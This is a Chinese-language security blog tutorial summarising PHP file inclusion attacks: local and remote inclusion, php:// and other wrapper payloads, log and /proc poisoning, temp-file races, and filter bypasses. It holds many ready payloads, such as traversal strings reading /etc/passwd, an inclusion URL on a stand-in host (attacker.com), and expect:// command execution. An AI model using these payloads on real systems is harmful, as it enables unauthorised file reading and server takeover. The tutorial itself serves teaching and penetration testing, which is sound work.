---
title: File Inclusion Summary
author: Loong716
date: 2019-11-03 14:10:00 +0800
categories: [Web]
tags: [File_Inclusion]
---

**文件包含(File Inclusion)**顾名思义就是让代码去包含一个文件，其实就是在编写代码时“引用”其他文件的代码。以PHP为例，php的文件包含相关函数都是无论其参数的扩展名是什么，都会将其内容作为php代码解析，这可能就会造成任意的php代码执行。

如果一个功能需要包含用户传来的参数时，且开发者又没有对用户的输入进行检测和过滤，那么就很可能使攻击者利用该功能进行文件包含漏洞的攻击。

* toc
{:toc}

## LFI与RFI

文件包含漏洞又可以分为**本地文件包含(Local File Inclusion)**和**远程文件包含(Remote File Inclusion)**

本地文件包含就是对服务器本地的文件进行包含，比如：

`http://example.com/include.php?file=../../../../../etc/passwd`

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5rtwbksj30pn09v75r.jpg)

这样就可以造成任意文件的读取、敏感信息泄露，甚至可以配合文件上传getshell

远程文件包含就是可以包含远程服务器的文件，条件是需要php.ini的配置：

``` htmlbars
allow_url_fopen = On (默认为On)
allow_url_include = On  (php5.2之后默认为Off)

PS:因为allow_url_include = On的前提是allow_url_fopen = On，所以必须两者都为On
```
远程文件包含的情况就是：

`http://example.com/include.php?file=http://attacker.com/evil.txt`

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5ru5qb1j30tt08a0tf.jpg)

个人觉得还要列一个我在php文档中看到的点：

> 处理返回值：在失败时 include 返回 FALSE 并且发出警告。成功的包含则返回 1，除非在包含文件中另外给出了返回值。可以在被包括的文件中使用 return 语句来终止该文件中程序的执行并返回调用它的脚本。同样也可以从被包含的文件中返回值。可以像普通函数一样获得 include 调用的返回值。不过这在包含远程文件时却不行，除非远程文件的输出具有合法的 PHP 开始和结束标记（如同任何本地文件一样）。可以在标记内定义所需的变量，该变量在文件被包含的位置之后就可用了。

对这个点感兴趣的可以测试一下远程文件包含时，在远程服务器上如果放上不同的PHP文件，再进行文件包含：

``` php
//phpinfo.php 这个回显的是phpinfo.php所在的远程服务器的phpinfo
<?php
phpinfo();
?>
```

``` php
//phpinfo.php 这个回显的是进行文件包含的服务器的phpinfo
<?php
echo '<?php phpinfo();?>';
?>
```


## 相关函数

php中会造成文件包含的函数有以下四个：

``` htmlbars
include()
include_once()
require()
require_once()
```

这几个函数之间的主要区别：

+ `require_once()`与`include_once`这两个函数会检测文件是否被包含过，如果被包含过就不会再包含
+ `require()`在执行遇到错误使会直接退出当前脚本，而`include()`在遇到错误时则会抛出一个警告，而脚本则会继续执行下去

还有几个在php文档中看到的几个点，记录一下：

> + 被包含文件先按参数给出的路径寻找，如果没有给出目录（只有文件名）时则按照`include_path` 指定的目录寻找。如果在 `include_path` 下没找到该文件则 `include` 最后才在调用脚本文件所在的目录和当前工作目录下寻找。
> + 当一个文件被包含时，语法解析器在目标文件的开头脱离 PHP 模式并进入 HTML 模式，到文件结尾处恢复。由于此原因，目标文件中需要作为 PHP 代码执行的任何代码都必须被包括在有效的 PHP 起始和结束标记之中。 
> + 如果“URL include wrappers”在 PHP 中被激活，可以用 URL（通过 HTTP 或者其它支持的封装协议——见支持的协议和封装协议）而不是本地文件来指定要被包含的文件。如果目标服务器将目标文件作为 PHP 代码解释，则可以用适用于 HTTP GET 的 URL 请求字符串来向被包括的文件传递变量。严格的说这和包含一个文件并继承父文件的变量空间并不是一回事；该脚本文件实际上已经在远程服务器上运行了，而本地脚本则包括了其结果。

第三点中的**"URL include wrappers"**被激活的意思其实就是php的`all_url_include`为`On`，后面提到的协议和封装协议在文件包含中也很有用

具体参见：[PHP Maunal: include()](https://www.php.net/manual/zh/function.include.php)

JSP等与此原理都类似，不再赘述

## 各种姿势

注意所有读取文件的都需要有读权限才可以成功包含

### 封装协议

#### php://filter

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5ruo9tuj311a0ebta9.jpg)

这个多数用来读源码，因为编码后可以防止该文件被作为php文件解析

我们可以使用以下payload来进行文件包含：

``` htmlbars
php://filter//convert.base64-encode/resource=../../../../etc/passwd
```

这样就可以得到被包含文件经过base64编码后的值：

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5rvat32j316v06emxp.jpg)

还可以使用其他不同的编码方式来对被包含文件进行编码：

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5rz7kcvj30wn01oglh.jpg)


``` htmlbars
php://filter/read=string.rot13/resource=../../../../etc/passwd

php://filter/convert.iconv.utf-8.utf-16/resource=../../../../etc/passwd
```

还可以对读取到的文件内容进行多次编码

``` htmlbars
对文件内容进行三次base64编码（当然也可以几种编码配合）：
php://filter/convert.base64-encode|convert.base64-encode|convert.base64-encode/resource=/etc/passwd
```

还可以将读出来的数据压缩：

``` htmlbars
压缩：
php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd

解压：
php://filter/convert.base64-decode/zlib.inflate/resource=/etc/passwd
```

#### php://input

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5rvuhcwj310p09vab5.jpg)

简而言之就是php用来读取原始POST数据流的一个伪协议，使用这个伪协议需要php.ini中设置`allow_url_include = On`，而且`Coentent-Type`不能为`multipart/form-data`


常用payload：

`php://input`然后POST传参`<?php phpinfo();?>`


#### file://

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5rw25oqj310o0c074z.jpg)

该协议可以使用绝对路径来包含文件

``` htmlbars
file:///etc/passwd
file://E:/phpstudy/www/index.php
file://E:\phpstudy\www\index.php
```

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5rwne7wj30sm07cwfi.jpg)

#### zip://等压缩文件协议

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5rx9u1tj310m0io3zp.jpg)

`zlib://`对应的是`.gz`文件，`bzip2://`对应的是`.bz2`，`zip://`对应的是zip（其实严格来讲跟扩展名无关，读取的是压缩流）

我们以`zip://`为例：

首先创建一个内容为php代码的txt文件，将该文件打包成zip

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5rxm9j9j30pd08cmyz.jpg)

再将phpinfo.zip改为phpinfo.jpg，上传到服务器

然后使用`zip://`进行文件包含：

`zip://phpinfo.jpg%23phpinfo.txt`

payload的意思就是读取phpinfo.jpg压缩流中的phpinfo.txt，注意GET传参时一定要把`#`编码为`%23`

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5rxsxjpj30rc062dg4.jpg)


#### data://

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5ry5ofdj30vm0dejrl.jpg)

该协议受限于` allow_url_include`，必须配置为`On`

`data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+`

base64部分的内容为`<?php phpinfo();?>`

#### phar://

这个之前写过，戳这里：[phar://协议与phar文件的利用](http://loong716.top/2019/09/16/phar.html)

#### expect://

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l63rnqnpj310z0dhdgd.jpg)

需要服务器的php安装了`>> Expect`扩展，使用`expect://`可以执行命令：

`expect://pwd`

### 日志文件

Linux下常见的日志文件如下所示，我们拿apache的`access.log`和ssh的日志`auth.log`来复现

> /var/log/apache/access.log
> /var/log/apache/error.log
> /var/log/nginx/access.log
> /var/log/nginx/error.log
> /var/log/vsftpd.log
> /var/log/sshd.log
> /var/log/auth.log
> /var/log/mail
> /var/log/httpd/error_log
> /usr/local/apache/log/error_log
> /usr/local/apache2/log/error_log


#### access.log

Apache的`access.log`文件是记录访问请求的日志文件，因此我们可以通过将一句话木马作为请求，就可以将其写入到日志文件中

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5rygfb6j30l602y0sr.jpg)

注意我们如果想把一句话正确的写入到日志中，需要使用`curl`或者使用burp抓包来改请求，否则就会像上面的那个请求那样将`<`等变为`%3C`等

`curl -v "http://116.62.227.151:81/<?php phpinfo();?>"`

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5ryblezj30g002wjra.jpg)

然后就可以利用文件包含漏洞来包含`access.log`

#### auth.log

sshd.log是记录ssh连接的日志文件，我们先看一下正常的日志有哪些内容：

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5ryk3ehj30ko038t8r.jpg)

会有连接的用户信息，我们可以使用一个一句话作为用户名来尝试ssh连接

`ssh '<?php phpinfo();?>@116.62.227.151'`

然后就会看到代码被写入到了`auth.log`：

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5ryqufpj30l404zdg4.jpg)

然后包含就可以了


### /proc/self/environ

`/proc/self/environ`是apache的环境变量文件

通过`User-Agent`向里面写内容的条件是：php以cgi模式运行

因此我们可以通过修改请求头中的`User-Agent`为`<?php phpinfo();?>`，就可以向该文件中写入，然后再包含即可


### /proc/*/fd/

该目录`/proc/*`中的`*`代表的是进程号(PID)，而`/proc/*/fd`下的文件才是我们真正要包含的文件，通常我们可以将一句话写入`referer`头，然后就会写入该目录下某个文件中

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l629xdqtj30e505hwel.jpg)

Github的**PayloadAllThings**项目提供了一种我认为可行的方案：

> 1. 写入大量的一句话木马(比如100个)
> 2. 然后对PID和文件名称进行爆破($file=/proc/[PID]/fd/[filename])


### php临时文件

php在上传文件时都会产生一个临时文件，将数据先写入临时文件，等完成文件上传后再删除临时文件（整个过程如下图所示）。

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5rtmf4yj30oo0emgqi.jpg)

但是临时文件名是随机的，可以在phpinfo中查看。因此如果我们拿到一个网站的phpinfo，此时又有上传（做了一些关于文件内容的过滤）和文件包含，就可以利用条件竞争来包含临时文件，让其在指定目录生成一个一句话木马

该漏洞使用vulhub中的环境复现，具体思路可参考这里：[Vulhub—php_inclusion](https://github.com/vulhub/vulhub/tree/master/php/inclusion)

首先使用exp来访问临时文件拿到生成的一句话的路径
![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l6296vw6j30hp05ejv6.jpg)

然后包含一句话来执行命令
![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l629izuyj30rj04qdg6.jpg)


### session文件

之前在ichunqiu的CTF训练场中碰到过一次session文件包含的题，可以参考这道题来学习session文件包含：

[i春秋CTF竞赛训练营--notebook](http://loong716.top/2019/08/29/ichunqiu-ctf-writeup.html#notebook)

## Bypass

有时候进行文件包含会有很多限制，我们要想办法去绕过

### %00截断

这个都非常熟悉了，条件是`php < 5.34`，并且`magic_quotes_gpc = Off`。在文件包含中一般情况下是因为后端代码指定了包含的文件的扩展名，因此如果想要包含任意文件我们需要截断后面的内容

后端示例：

``` php
<?php
include($_GET['filename'] . 'php');
?>
```

然后我们就可以使用payload：`../../../../etc/passwd%00`

### url二次编码

如果后端对用户的输入进行URL解码后再包含的话（类似下面的代码），就有可能利用url二次编码来绕过前面的过滤

``` php
<?php
include(urldecode($_GET['file']));
?>
```

我们先看一下利用的payload：`%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`

payload先被浏览器进行一次url解码，`%25`对应`%`，此时payload变为：`%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd`

之后又被php进行一次url解码，`%2e`对应`.`，`%2f`对应`/`，因此最后包含的就是`../../../etc/passwd`

### UTF-8

这个是apache tomcat的洞(好像是java的锅)，可以使用UTF-8来进行目录遍历：

> 受影响版本：
> 
> Apache Tomcat 6.x
> 
> Apache Tomcat 5.x
> 
> Apache Tomcat 4.x

payload：`%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd`


### 双写等tricks

有时候后端代码写的不严谨的时候，就很有可能存在绕过，比如使用`str_replace()`将`../`替换为空时，可以使用双写绕过：

`..././..././..././etc/passwd`

具体还要根据实际过滤情况来绕过

### 路径长度截断

这个我本地测试是失败的，做个参考吧

当`php < 5.2.8`时，可以重复使用`./`或`.`来进行截断，linux下需要长度大于4096，windows下需要大于256

``` htmlbars
../../../../etc/passwd/./././././[...]./././././

../../../../etc/passwd/..........[...]..........
```

### bypass allow_url_include = Off

该方法可以绕过`allow_url_include = Off`和`allow_url_fopen = Off`的情况，包含smb共享服务中的文件，但只适用于Windows的服务器，而且国内很多运营商都默认关闭了445端口，所以还是稍微鸡肋了点

SMB的环境搭建可以看这里：[Linux SMB bypass RFI](http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html)

首先我在smb共享文件夹下放一个如下图所示的phpinfo.txt：

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5rzdmh4j30n106r74f.jpg)

此时我的php.ini中`allow_url_include`和`allow_url_fopen`都为`Off`，先尝试包含一个远程文件，发现受配置的限制

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l5s00qhfj31dq08pta3.jpg)

然后我们尝试包含smb服务的文件：

`?file=\\192.168.206.132\Loong716\phpinfo.txt`

![Alt text](http://tva1.sinaimg.cn/large/007X8olVly1g8l628s2o7j312u086aav.jpg)


## 常见漏洞点与利用

理论上只要是与文件有关的参数都有可能会产生文件包含，比如经常出现在ctf中的：`index.php?action=upload`，可以与`php://filter`配合来读源码 

还有一些带有`path`、`file`的参数，或者参数值是`xxx.xml`等文件的，都也有可能存在文件包含。甚至有些不起眼的参数会有可能，这些可能要fuzz才能发现。

关于利用的话，一般就是配合上传去getshell，或者就是通过文件包含来获取一些敏感信息来帮助我们进一步的渗透
